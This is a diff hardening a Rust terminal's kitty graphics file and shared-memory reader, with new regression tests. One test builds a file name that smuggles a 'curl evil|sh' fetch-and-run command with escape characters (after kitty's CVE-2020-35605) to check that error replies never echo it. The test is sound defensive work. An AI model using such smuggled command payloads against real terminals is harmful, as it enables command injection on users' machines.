@@ -5,7 +5,8 @@
 //! reads it, and turns the command into a direct transmission of the bytes it read, which
 //! every copy then parses the same way.
 
-use std::io::Read;
+use std::io::{Read, Seek};
+use std::os::unix::fs::OpenOptionsExt;
 use std::sync::Arc;
 
 use base64::Engine;
@@ -35,16 +36,43 @@ pub enum Media {
 }
 
 /// Reads file / shared memory transmissions, collecting chunked ones.
-#[derive(Default)]
 pub struct MediaReader {
     /// Control data and base64 payload of a chunked transmission so far.
     pending: Option<(Vec<u8>, Vec<u8>)>,
+    /// Most bytes one transmission may read (the image memory limit).
+    max_bytes: usize,
+    /// False for a copy of a pane's terminal fed another machine's stream (the app's): it
+    /// must never read this machine's files for it.
+    enabled: bool,
+}
+
+impl Default for MediaReader {
+    fn default() -> Self {
+        MediaReader {
+            pending: None,
+            max_bytes: 320 * 1024 * 1024,
+            enabled: true,
+        }
+    }
 }
 
 /// Base64 bytes per chunk of the direct transmissions we write (the protocol's 4096).
 const CHUNK: usize = 4096;
+/// Most base64 bytes of a file or shared memory name (chunks included).
+const MAX_NAME_PAYLOAD: usize = 4096;
+/// Where reading a file can block or reach other machines (automounts, devices).
+const FORBIDDEN_PREFIXES: &[&str] = &["/dev/", "/net/", "/Volumes/", "/System/Volumes/", "/proc/"];
 
 impl MediaReader {
+    pub fn set_max_bytes(&mut self, max: usize) {
+        self.max_bytes = max;
+    }
+
+    pub fn set_enabled(&mut self, enabled: bool) {
+        self.enabled = enabled;
+        self.pending = None;
+    }
+
     /// `body` is an APC body taken out of the stream (`G` + control data `;` payload).
     pub fn handle(&mut self, body: &[u8]) -> Media {
         let Some(body) = body.strip_prefix(b"G") else {
@@ -55,6 +83,10 @@ impl MediaReader {
             None => (body, &[][..]),
         };
         let more = key(ctl, b'm') == Some(b"1");
+        // A command of its own (not a continuation chunk) abandons an unfinished one.
+        if key(ctl, b't').is_some() || key(ctl, b'a').is_some() {
+            self.pending = None;
+        }
         let (ctl, payload) = match self.pending.take() {
             Some((first, mut data)) => {
                 data.extend_from_slice(payload);
@@ -62,21 +94,31 @@ impl MediaReader {
             }
             None => (ctl.to_vec(), payload.to_vec()),
         };
+        if payload.len() > MAX_NAME_PAYLOAD {
+            return reply(&ctl, err("EINVAL", "file name too long"))
+                .map_or(Media::Drop, Media::Reply);
+        }
         if more {
             self.pending = Some((ctl, payload));
             return Media::Wait;
         }
-        match read(&ctl, &payload) {
+        if !self.enabled {
+            return Media::Drop;
+        }
+        match read(&ctl, &payload, self.max_bytes) {
             Ok(raw) => Media::Direct(direct_transmission(&ctl, &raw)),
             Err(e) => reply(&ctl, e).map_or(Media::Drop, Media::Reply),
         }
     }
 }
 
-type Err = (&'static str, String);
+/// An error code and message. Both are fixed strings: a reply is written to the program's
+/// input, so it must never echo anything the program sent (a file name could hold a command
+/// line for the shell to run once the program exits).
+type Err = (&'static str, &'static str);
 
-fn err(code: &'static str, msg: impl Into<String>) -> Err {
-    (code, msg.into())
+fn err(code: &'static str, msg: &'static str) -> Err {
+    (code, msg)
 }
 
 /// The value of key `k` in kitty control data.
@@ -92,7 +134,7 @@ fn num(ctl: &[u8], k: u8) -> Option<usize> {
 }
 
 /// The bytes a file / temporary file / shared memory transmission refers to.
-fn read(ctl: &[u8], payload: &[u8]) -> Result<Vec<u8>, Err> {
+fn read(ctl: &[u8], payload: &[u8], max: usize) -> Result<Vec<u8>, Err> {
     let clean: Vec<u8> = payload
         .iter()
         .copied()
@@ -105,16 +147,19 @@ fn read(ctl: &[u8], payload: &[u8]) -> Result<Vec<u8>, Err> {
         .ok_or_else(|| err("EINVAL", "bad file name"))?;
     let (offset, size) = (num(ctl, b'O').unwrap_or(0), num(ctl, b'S'));
     match key(ctl, b't').and_then(|m| m.first()) {
-        Some(b'f') => read_file(&name, offset, size),
+        Some(b'f') => read_file(&name, offset, size, max),
         Some(b't') => {
             if !is_temp_graphics_file(&name) {
                 return Err(err("EPERM", "not a temporary graphics file"));
             }
-            let bytes = read_file(&name, offset, size);
-            let _ = std::fs::remove_file(&name);
+            let bytes = read_file(&name, offset, size, max);
+            // Only a regular file (not a link to one) is deleted.
+            if std::fs::symlink_metadata(&name).is_ok_and(|m| m.file_type().is_file()) {
+                let _ = std::fs::remove_file(&name);
+            }
             bytes
         }
-        Some(b's') => read_shm(&name, offset, size),
+        Some(b's') => read_shm(&name, offset, size, max),
         _ => Err(err("EINVAL", "unknown transmission medium")),
     }
 }
@@ -174,22 +219,37 @@ fn reply(ctl: &[u8], (code, msg): Err) -> Option<Vec<u8>> {
     if let Some(p) = num(ctl, b'p').filter(|&p| p != 0) {
         fields.push(format!("p={p}"));
     }
-    Some(format!("\x1b_G{};{code}:{msg}\x1b\\", fields.join(",")).into_bytes())
+    // Fixed strings already; keep them printable ASCII regardless.
+    let text: String = format!("{code}:{msg}")
+        .chars()
+        .filter(|c| c.is_ascii_graphic() || *c == ' ')
+        .collect();
+    Some(format!("\x1b_G{};{text}\x1b\\", fields.join(",")).into_bytes())
+}
+
+/// The `len` bytes to read from offset `offset` of an object of `total` bytes, at most `max`.
+fn span(total: usize, offset: usize, size: Option<usize>, max: usize) -> Result<usize, Err> {
+    if offset > total {
+        return Err(err("EINVAL", "offset past the end"));
+    }
+    let len = size.unwrap_or(total - offset).min(total - offset);
+    if len > max {
+        return Err(err("EFBIG", "image data too large"));
+    }
+    Ok(len)
 }
 
 /// Reads and unlinks a POSIX shared memory object (`t=s`), as the protocol requires.
-fn read_shm(name: &str, offset: usize, size: Option<usize>) -> Result<Vec<u8>, Err> {
-    if name.is_empty() || name.len() > 255 || name[1..].contains('/') {
+fn read_shm(name: &str, offset: usize, size: Option<usize>, max: usize) -> Result<Vec<u8>, Err> {
+    let rest = name.strip_prefix('/').unwrap_or(name);
+    if rest.is_empty() || name.len() > 255 || rest.contains('/') {
         return Err(err("EINVAL", "bad shared memory name"));
     }
     let cname =
         std::ffi::CString::new(name).map_err(|_| err("EINVAL", "bad shared memory name"))?;
     let fd = unsafe { libc::shm_open(cname.as_ptr(), libc::O_RDONLY, 0) };
     if fd < 0 {
-        return Err(err(
-            "EBADF",
-            format!("shm_open {name}: {}", std::io::Error::last_os_error()),
-        ));
+        return Err(err("EBADF", "cannot open the shared memory"));
     }
     let result = (|| {
         let mut st: libc::stat = unsafe { std::mem::zeroed() };
@@ -197,10 +257,7 @@ fn read_shm(name: &str, offset: usize, size: Option<usize>) -> Result<Vec<u8>, E
             return Err(err("EBADF", "fstat failed"));
         }
         let total = st.st_size.max(0) as usize;
-        if offset > total {
-            return Err(err("EINVAL", "offset past the end of the shared memory"));
-        }
-        let len = size.unwrap_or(total - offset).min(total - offset);
+        let len = span(total, offset, size, max)?;
         if len == 0 {
             return Ok(Vec::new());
         }
@@ -246,22 +303,31 @@ fn is_temp_graphics_file(path: &str) -> bool {
     !path.contains("..") && dirs.iter().any(|d| path.starts_with(d.as_str()))
 }
 
-fn read_file(path: &str, offset: usize, size: Option<usize>) -> Result<Vec<u8>, Err> {
-    let mut f = std::fs::File::open(path).map_err(|e| err("EBADF", format!("{path}: {e}")))?;
-    let meta = f.metadata().map_err(|e| err("EBADF", e.to_string()))?;
+fn read_file(path: &str, offset: usize, size: Option<usize>, max: usize) -> Result<Vec<u8>, Err> {
+    if !path.starts_with('/') || FORBIDDEN_PREFIXES.iter().any(|p| path.starts_with(p)) {
+        return Err(err("EPERM", "file not allowed"));
+    }
+    // Never blocks on open (a FIFO without a writer) and never follows a final symlink; only
+    // regular files are read.
+    let mut f = std::fs::OpenOptions::new()
+        .read(true)
+        .custom_flags(libc::O_NONBLOCK | libc::O_NOFOLLOW | libc::O_CLOEXEC)
+        .open(path)
+        .map_err(|_| err("EBADF", "cannot open the file"))?;
+    let meta = f
+        .metadata()
+        .map_err(|_| err("EBADF", "cannot stat the file"))?;
     if !meta.is_file() {
         return Err(err("EBADF", "not a regular file"));
     }
-    if meta.len() > 512 * 1024 * 1024 {
-        return Err(err("EFBIG", "file too large"));
-    }
-    let mut buf = Vec::new();
-    f.read_to_end(&mut buf)
-        .map_err(|e| err("EBADF", e.to_string()))?;
-    let start = offset.min(buf.len());
-    let end = size.map_or(buf.len(), |s| (start + s).min(buf.len()));
-    buf.truncate(end);
-    buf.drain(..start);
+    let total = usize::try_from(meta.len()).unwrap_or(usize::MAX);
+    let len = span(total, offset, size, max)?;
+    f.seek(std::io::SeekFrom::Start(offset as u64))
+        .map_err(|_| err("EBADF", "cannot read the file"))?;
+    let mut buf = Vec::with_capacity(len);
+    f.take(len as u64)
+        .read_to_end(&mut buf)
+        .map_err(|_| err("EBADF", "cannot read the file"))?;
     Ok(buf)
 }
 
@@ -274,7 +340,8 @@ pub fn decode_png(data: &[u8]) -> Option<(u32, u32, Vec<u8>)> {
         let info = reader.info();
         (info.width, info.height)
     };
-    if w > 10000 || h > 10000 {
+    // 10000 pixels a side, and at most 256 MiB decoded.
+    if w > 10000 || h > 10000 || (w as usize) * (h as usize) * 4 > 256 << 20 {
         return None;
     }
     let mut buf = vec![0; reader.output_buffer_size()?];
@@ -338,6 +405,125 @@ mod tests {
         assert_eq!(decoded, raw);
         // Regular files stay.
         assert!(path.exists());
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    fn reply_text(m: Media) -> String {
+        match m {
+            Media::Reply(r) => String::from_utf8(r).unwrap(),
+            other => panic!("no reply: {other:?}"),
+        }
+    }
+
+    #[test]
+    fn error_replies_never_echo_the_name() {
+        // A file name holding a command line for the shell (kitty's CVE-2020-35605).
+        let name = b64(b"/nonexistent/x\rcurl evil|sh\r\x1b\\");
+        let text =
+            reply_text(MediaReader::default().handle(format!("Ga=t,t=f,i=1;{name}").as_bytes()));
+        assert_eq!(text, "\x1b_Gi=1;EBADF:cannot open the file\x1b\\");
+        let text = reply_text(
+            MediaReader::default()
+                .handle(format!("Ga=t,t=s,i=1;{}", b64(b"/thurm-none\rx")).as_bytes()),
+        );
+        assert!(
+            !text.contains('\r') && !text.contains("thurm-none"),
+            "{text:?}"
+        );
+    }
+
+    #[test]
+    fn hostile_names_and_offsets_do_not_panic() {
+        let mut r = MediaReader::default();
+        // Multi-byte first character of a shared memory name.
+        let text =
+            reply_text(r.handle(format!("Ga=t,t=s,i=1;{}", b64("é/x".as_bytes())).as_bytes()));
+        assert!(text.contains("EINVAL"), "{text}");
+        let text = reply_text(r.handle(format!("Ga=t,t=s,i=1;{}", b64("é".as_bytes())).as_bytes()));
+        assert!(!text.is_empty());
+
+        let dir = std::env::temp_dir().join(format!("thurm-kitty-off-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let path = dir.join("data");
+        std::fs::write(&path, [1u8; 100]).unwrap();
+        let name = b64(path.to_str().unwrap().as_bytes());
+        // Offset plus size overflows.
+        let text = reply_text(
+            r.handle(format!("Ga=t,t=f,i=1,O=18446744073709551615,S=10;{name}").as_bytes()),
+        );
+        assert!(text.contains("EINVAL"), "{text}");
+        let Media::Direct(_) =
+            r.handle(format!("Ga=t,t=f,i=1,O=10,S=18446744073709551615;{name}").as_bytes())
+        else {
+            panic!("size is clamped to the file");
+        };
+        // More than the image memory limit.
+        r.set_max_bytes(50);
+        let text = reply_text(r.handle(format!("Ga=t,t=f,i=1;{name}").as_bytes()));
+        assert!(text.contains("EFBIG"), "{text}");
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn only_regular_files_are_read() {
+        let dir = std::env::temp_dir().join(format!("thurm-kitty-fifo-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let fifo = dir.join("fifo");
+        let c = std::ffi::CString::new(fifo.to_str().unwrap()).unwrap();
+        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
+        let link = dir.join("link");
+        std::fs::write(dir.join("real"), [0u8; 4]).unwrap();
+        std::os::unix::fs::symlink(dir.join("real"), &link).unwrap();
+        let mut r = MediaReader::default();
+        let started = std::time::Instant::now();
+        // A FIFO without a writer must not block the parser.
+        let text = reply_text(
+            r.handle(format!("Ga=t,t=f,i=1;{}", b64(fifo.to_str().unwrap().as_bytes())).as_bytes()),
+        );
+        assert!(text.contains("EBADF"), "{text}");
+        assert!(started.elapsed() < std::time::Duration::from_secs(1));
+        let text = reply_text(
+            r.handle(format!("Ga=t,t=f,i=1;{}", b64(link.to_str().unwrap().as_bytes())).as_bytes()),
+        );
+        assert!(text.contains("EBADF"), "{text}");
+        for bad in ["/dev/zero", "/net/host/x", "relative/path"] {
+            let text =
+                reply_text(r.handle(format!("Ga=t,t=f,i=1;{}", b64(bad.as_bytes())).as_bytes()));
+            assert!(text.contains("EPERM"), "{bad}: {text}");
+        }
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn chunk_limits_and_abandoned_chunks() {
+        let mut r = MediaReader::default();
+        let long = "A".repeat(3000);
+        assert_eq!(
+            r.handle(format!("Ga=t,t=f,i=1,m=1;{long}").as_bytes()),
+            Media::Wait
+        );
+        let text = reply_text(r.handle(format!("Gm=1;{long}").as_bytes()));
+        assert!(text.contains("EINVAL"), "{text}");
+        // An unfinished transmission is dropped when a new command starts.
+        assert_eq!(
+            r.handle(format!("Ga=t,t=f,i=1,m=1;{}", b64(b"/nonex")).as_bytes()),
+            Media::Wait
+        );
+        let text =
+            reply_text(r.handle(format!("Ga=t,t=f,i=2;{}", b64(b"/nonexistent/y")).as_bytes()));
+        assert!(text.starts_with("\x1b_Gi=2;"), "{text}");
+    }
+
+    #[test]
+    fn disabled_reader_reads_nothing() {
+        let dir = std::env::temp_dir().join(format!("thurm-kitty-off2-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let path = dir.join("data");
+        std::fs::write(&path, [1u8; 16]).unwrap();
+        let mut r = MediaReader::default();
+        r.set_enabled(false);
+        let body = format!("Ga=t,t=f,i=1;{}", b64(path.to_str().unwrap().as_bytes()));
+        assert_eq!(r.handle(body.as_bytes()), Media::Drop);
         std::fs::remove_dir_all(dir).unwrap();
     }
 
